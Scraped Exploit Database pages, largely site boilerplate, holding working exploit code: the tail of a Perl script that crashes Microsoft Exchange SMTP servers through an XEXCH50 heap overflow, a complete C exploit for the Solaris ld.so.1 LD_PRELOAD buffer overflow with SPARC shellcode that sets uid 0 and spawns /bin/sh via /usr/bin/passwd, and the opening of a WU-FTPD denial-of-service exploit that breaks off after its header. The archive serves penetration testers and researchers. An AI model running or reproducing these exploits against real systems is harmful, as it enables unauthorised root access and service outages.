server only allows XEXCH50 after NTLM authenticationif ($res !~ /354 Send binary/i){print "[*] This server has been patched or is not vulnerable.\n";exit(0);}print "[*] This system is vulnerable: $host:$port\n";exit(0);}sub crash{my $s = SMTP($host, $port);if (! $s){print "[*] Error establishing connection to SMTP service.\n";exit(0);}# the negative value allows us to overwrite random heap bitsprint $s "XEXCH50 -1 2\r\n";my $res = <$s>;# a patched server only allows XEXCH50 after NTLM authenticationif ($res !~ /354 Send binary/i){print "[*] This server has been patched or is not vulnerable.\n";exit(0);}print "[*] Sending massive heap-smashing string...\n";print $s ("META" x 16384);# sometimes a second connection is required to trigger the crash$s = SMTP($host, $port);exit(0);}sub usage{print STDERR "Usage: $0 <host> [CHECK|CRASH]\n";exit(0);}sub SMTP{my ($host, $port) = @_;my $s = IO::Socket::INET->new(PeerAddr => $host,PeerPort => $port,Proto    => "tcp") || return(undef);my $r = <$s>;return undef if !$r;if ($r !~ /Microsoft/){chomp($r);print STDERR "[*] This does not look like an exchange server: $r\n";return(undef);}print $s "HELO X\r\n";$r = <$s>;return undef if !$r;print $s "MAIL FROM: DoS\r\n";$r = <$s>;return undef if !$r;print $s "RCPT TO: Administrator\r\n";$r = <$s>;return undef if !$r;return($s);}# milw0rm.com [2003-10-22]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPort142122232542495366697079808110210511011111311912313513914316116216438338940240641144344444544650250451351451553254855455561762363165568978378780887388890199810001040108910991100111411201194123514711521153315811589160416171723174317611812185818611900194720002022204921002103212121252181224223152375238023812401248025252640281028122947295429903000303030503052312831293181320032173306333333783389346034653500353536323690379038143817400040024070408141054111432243434434450145554592466147504848500050605061508050815093515151805247525052725308543254665554555556005655566658005803581458585900598460666070608060826101611261296379650265036660666770017002707070717080710071447210727272907426744375107547764977707777777877877879790280008001800280048008802080228023802880308080808180828088809081818300840084438445847385008585861988008812883988808888900090019002908090909091910091249200925192569443944797849788985598769900998799939999100001000110080102021020310443106161100011211114601220312221123451239712401133271370113722138381699218821188811900019810198132000020010200312011120171220032342325672260002701527700280153000030303313373240032674327643420537215377773784838292400074152344334468244808049152500005049652311527895286952986534135434554890555545555556380577725808062514TagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 114
Solaris Runtime Linker (SPARC) - 'ld.so.1' Local Buffer Overflow - Solaris local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDSolaris Runtime Linker (SPARC) - 'ld.so.1' Local Buffer OverflowEDB-ID:114CVE:2003-0609EDB Verified:Author:osker178Type:localExploit:/Platform:SolarisDate:2003-10-27Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/* #############################* ## ld.so.1 exploit (SPARC) ##* #############################* [coded by: osker178 (bjr213 psu.edu)]** Alright, so this exploits a fairly standard buffer* overflow in the default Solaris runtime linker (ld.so.1)* (discovery by Jouko Pynnonen)* Only real deviation here from the standard overflow* and return into libc scenario is that at the time that* overflow occurs, the libc object file has not been loaded;* so it's not really possible to return into a libc function.* However, this poses no real problem to us, as ld.so.1* provides it's own ___cpy() functions which we can use to* move our shellcode into an appropriate place in memory.** Some things to note:**  -  obviously some of the pre-defined addresses will have to be changed**  -  1124-1128 bytes into our buffer provided to LD_PRELOAD we will end up*     overwriting a char *; this is actually very helpful for locating where*     the rest of our information is stored in memory, as this pointer*     will be used to display another error message, showing us what string*     is stored at the address we overwrote this pointer with.**  -  ... eh, that's enough, just look at the code to figure the rest out*/#include <dlfcn.h>#include <stdio.h>#include <signal.h>#include <setjmp.h>#include <unistd.h>#include <stdlib.h>#include <string.h>#include <sys/mman.h>#include <link.h>char SPARC_sc[] =/* setuid(0) */"\x90\x1b\xc0\x0f" /* xor     %o7,%o7,%o0 */"\x82\x10\x20\x17" /* mov     23,%g1 | 23 == SYS_setuid()*/"\x91\xd0\x20\x08" /* ta      8 *//* setreuid(0,0) - for me at least, these both had to be called */"\x92\x1a\x40\x09" /* xor     %o1,%o1,%o1 */"\x82\x10\x20\xca" /* mov     202, %g1 | 202 == SYS_setreuid()*/"\x91\xd0\x20\x08" /* ta      8 *//* exec(/bin/sh) */"\x21\x0b\xd8\x9a" /* sethi   %hi(0x2f626800), %l0 */"\xa0\x14\x21\x6e" /* or      %l0, 0x16e, %l0 ! 0x2f62696e */"\x23\x0b\xdc\xda" /* sethi   %hi(0x2f736800), %l1 */"\x90\x23\xa0\x10" /* sub     %sp, 16, %o0 */"\x92\x23\xa0\x08" /* sub     %sp, 8, %o1 */"\x94\x1b\x80\x0e" /* xor     %sp, %sp, %o2 */"\xe0\x3b\xbf\xf0" /* std     %l0, [%sp - 16] */"\xd0\x23\xbf\xf8" /* st      %o0, [%sp - 8] */"\xc0\x23\xbf\xfc" /* st      %g0, [%sp - 4] */"\x82\x10\x20\x3b" /* mov     59, %g1 | 59 = SYS_execve() */"\x91\xd0\x20\x08" /* ta      8 */;const long FRAME_ADDR = 0xffbee938;const long SHELLCODE_ADDR = 0xffbef17a;const long DESTCPY_ADDR = 0xff3e7118;const long DEF_OFFSET = 0x20;const int ENV_STR_SIZE = 2048;const int FRAME_SIZE = 64; /* 8 %i regs and 8 %l regs */const int DEF_FPAD_LEN = 4;const int REC_BUF_SIZE = 1456;char * get_ld_env(int buf_len, long offset);char * get_fake_frame(long offset);char * get_envs_str(char fill);unsigned long get_strcpy_addr();/* ********************************************** ** ******************** MAIN ******************** ** ********************************************** */int main(int argc, char **argv){char *prog[3];char *envs[7];char opt;int buf_size = -1;int fpad_len = -1;long offset = -1;char *ld_pre_env = 0x0;char *fake_frame = 0x0;/* padding of sorts */char *envs_str1 = 0x0;char *envs_str2 = 0x0;char *fpad_buf = 0x0;// ------------------------------------------------ //while((opt = getopt(argc, argv, "s:o:p:")) != -1){switch(opt) {case 's':if(!optarg) {printf("-s needs size argument\n");exit(0);}elsebuf_size = atoi(optarg);break;case 'o':if(!optarg) {printf("-o needs offset argument\n");exit(0);}elseoffset = atol(optarg);break;case 'p':if(!optarg) {printf("-p needs pad length argument\n");exit(0);}else {fpad_len = atoi(optarg);if(fpad_len < 0)fpad_len = 0;}break;default:printf("Usage: %s [-s size] [-o offset] [-p fpad_len]\n", argv[0]);exit(0);}argc -= optind;argv += optind;}printf("\n#######################################\n");printf("# ld.so.1 LD_PRELOAD (SPARC) exploit  #\n");printf("# coded by: osker178 (bjr213@psu.edu) #\n");printf("#######################################\n\n");if(buf_size == -1){printf("Using default/recommended buffer size of %d\n", REC_BUF_SIZE);buf_size = REC_BUF_SIZE;}else if(buf_size % 4){buf_size = buf_size + (4 - (buf_size%4));printf("WARNING: Rounding BUF_SIZE up to 0x%x (%d)\n", buf_size, buf_size);}if(offset == -1){printf("Using default OFFSET of 0x%x (%d)\n", DEF_OFFSET, DEF_OFFSET);offset = DEF_OFFSET;}else if((FRAME_ADDR + offset) % 8){offset = offset + (8 - (offset%8));printf("WARNING: Rounding offset up to 0x%x (%d)\n", offset, offset);printf("(otherwise FRAME_ADDR would not be alligned correctly)\n");}if(fpad_len == -1){printf("Using default FPAD_LEN of 0x%x (%d)\n", DEF_FPAD_LEN, DEF_FPAD_LEN);fpad_len = DEF_FPAD_LEN;}// -------------------------------------------------- //ld_pre_env = get_ld_env(buf_size, offset);if(!ld_pre_env)exit(0);fake_frame = get_fake_frame(offset);if(!fake_frame)exit(0);envs_str1 = get_envs_str('1');if(!envs_str1)exit(0);envs_str2 = get_envs_str('2');if(!envs_str2)exit(0);// -------------------------------------------------- //fpad_buf = (char *)malloc(fpad_len+1);if(!fpad_buf){perror("malloc");exit(0);}memset(fpad_buf, 'F', fpad_len);fpad_buf[fpad_len] = '\0';envs[0] = fpad_buf;envs[1] = fake_frame;envs[2] = envs_str1;envs[3] = SPARC_sc;envs[4] = envs_str2;envs[5] = ld_pre_env;envs[6] = NULL;prog[0] = "/usr/bin/passwd";prog[1] = "passwd";prog[2] = NULL;execve(prog[0], prog, envs);perror("execve");return 0;}/* ********************************************** *//* ********************************************** ** ***************** GET_LD_ENV ***************** ** ********************************************** */char * get_ld_env(int buf_len, long offset){long *lp;char *buf;char *ld_pre_env;unsigned long strcpy_ret;strcpy_ret = get_strcpy_addr();if(!strcpy_ret)return 0;elseprintf("strcpy found at [0x%x]\n\n", strcpy_ret);/** buf_size --> main requested length (rounded up to nearest factor of 4)* +FRAME_SIZE --> for the fake frame values (64 bytes worth) we will overwrite* +1 --> for the "/" character that must be appended in order to pass the strchr()*        and strrchr() tests (see <load_one>: from objdump -d /usr/lib/ld.so.1)* +1 --> '\0' obviously*/buf = (char *)malloc(buf_len + FRAME_SIZE + 1 + 1);if(!buf){perror("malloc");return 0;}memset(buf, 'A', buf_len);buf[0] = '/';/* this is the location of the (char *) in ld.so.1 we are overwriting* -> use this to find the address of the environment*    arguments (whatever value we write at this address*    is what will be displayed in an error message*    from ld.so.1 after the error message generated from*    our insecure path provided in LD_PRELOAD)*/lp = (long *)(buf + 1124);*lp++ = FRAME_ADDR + offset;lp = (long *)(buf + buf_len);/* %l regs - as far as we're concerned, these*           values don't matter (i've never*           had a problem with them)*/*lp++ = 0x61616161; /* %l0 */*lp++ = 0x62626262; /* %l1 */*lp++ = 0x63636363; /* %l2 */*lp++ = 0x64646464; /* %l3 */*lp++ = 0x65656565; /* %l4 */*lp++ = 0x66666666; /* %l5 */*lp++ = 0x67676767; /* %l6 */*lp++ = 0x68686868; /* %l7 *//* %i regs */*lp++ = 0x69696969;     /* %i0 */*lp++ = 0x70707070;     /* %i1 */*lp++ = 0x71717171;     /* %i2 */*lp++ = 0x72727272;     /* %i3 */*lp++ = 0x73737373;     /* %i4 */*lp++ = 0x74747474;     /* %i5 */*lp++ = FRAME_ADDR + offset; /* our fake frame/%i6 */*lp = strcpy_ret;      /* ret address/%i7 */strcat(buf, "/");/* put together our LD_PRELOAD buffer */ld_pre_env = (char *)malloc(strlen(buf) + strlen("LD_PRELOAD=") + 1);if(!ld_pre_env){perror("malloc");return 0;}strcpy(ld_pre_env, "LD_PRELOAD=");strcat(ld_pre_env + strlen(ld_pre_env), buf);free(buf);return ld_pre_env;}/* ********************************************** ** *************** GET_FAKE_FRAME *************** ** ********************************************** */char * get_fake_frame(long offset){long destcpy_addr;long *lp;char *frame = (char *)malloc(FRAME_SIZE + 1);if(!frame){perror("malloc");return 0;}/* this worked for me; may have to adjust though* - can easily find a good place by using gdb and pmap */destcpy_addr = get_strcpy_addr() + 0x17000;lp = (long *)frame;/* %l regs - values don't matter */*lp++ = 0x42454746; /* %l0 <- == "BEGF", use this to help locate frame's address */*lp++ = 0xdeaddead; /* %l1 */*lp++ = 0xdeaddead; /* %l2 */*lp++ = 0xdeaddead; /* %l3 */*lp++ = 0xdeaddead; /* %l4 */*lp++ = 0xdeaddead; /* %l5 */*lp++ = 0xdeaddead; /* %l6 */*lp++ = 0xdeaddead; /* %l7 *//* %i regs */*lp++ = destcpy_addr;              /* %i0 - DESTINATION ADDRESS for ___cpy() */*lp++ = (SHELLCODE_ADDR + offset); /* %i1 - SOURCE ADDRESS for ___cpy() */*lp++ = 0xdeaddead;                /* %i2 - size*/*lp++ = 0xdeaddead;                /* %i3 */*lp++ = 0xdeaddead;                /* %i4 */*lp++ = 0xdeaddead;                /* %i5 */*lp++ = destcpy_addr+0x200;        /* saved frame pointer/%i6(sp) */*lp++ = destcpy_addr-0x8;          /* %i7 */*lp++ = 0x0;return frame;}/* ********************************************** ** **************** GET_ENVS_STR **************** ** ********************************************** */char * get_envs_str(char fill){char *envs_str = (char *)malloc(ENV_STR_SIZE + 1);if(!envs_str){perror("malloc");return 0;}memset(envs_str, fill, ENV_STR_SIZE);envs_str[0] = 'b'; // \envs_str[1] = 'e'; // --- help find where we are in memory/in relation to other env variables  */envs_str[2] = 'g'; // /envs_str[ENV_STR_SIZE] = '\0';return envs_str;}/* ********************************************** ** *************** GET_STRCPY_ADDR ************** ** ********************************************** */unsigned long get_strcpy_addr(){void *handle;Link_map *lm;unsigned long addr;if((handle = dlmopen(LM_ID_LDSO, NULL, RTLD_LAZY)) == NULL){perror("dlmopen");return 0;}if((dlinfo(handle, RTLD_DI_LINKMAP, &lm)) == -1){perror("dlinfo");return 0;}if((addr = (unsigned long)dlsym(handle, "strcpy")) == NULL){perror("dlsym");return 0;}/* -4 to skip save and use* our fake frame instead */addr -= 4;/* make sure addr doesn't contain any 0x00 bytes,* or '/' characters (as this is where strcpy will* cutoff in ld.so.1) */if( !(addr & 0xFF) || !(addr & 0xFF00) ||!(addr & 0xFF0000) || !(addr & 0xFF000000) ||((addr & 0xFF) == 0x2f) ||((addr & 0xFF00) == 0x2f) ||((addr & 0xFF0000) == 0x2f) ||((addr & 0xFF000000) == 0x2f) ){printf("ERROR: strcpy address (0x%x) contains unusable bytes somewhere.\n", addr);printf("       -> consider using strncpy, memcpy, or another similar substitute instead.\n");return 0;}return addr;}// milw0rm.com [2003-10-27]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 115
WU-FTPD 2.6.2 - 'wuftpd-freezer.c' Remote Denial of Service - Linux dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDWU-FTPD 2.6.2 - 'wuftpd-freezer.c' Remote Denial of ServiceEDB-ID:115CVE:2003-0854EDB Verified:Author:Angelo RosielloType:dosExploit:/Platform:LinuxDate:2003-10-31Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/**		 (c) Rosiello Security** Copyright Rosiello Security 2003*	 All Rights reserved.** Tested on Red Hat 9.0** Author: Angelo Rosiello* Mail	: angelo rosiello org* This software is only for educational purpose.* Do not use it against machines different from yours.* Respect law.**/#include <stdio.h>#include <sys/types.h>#include 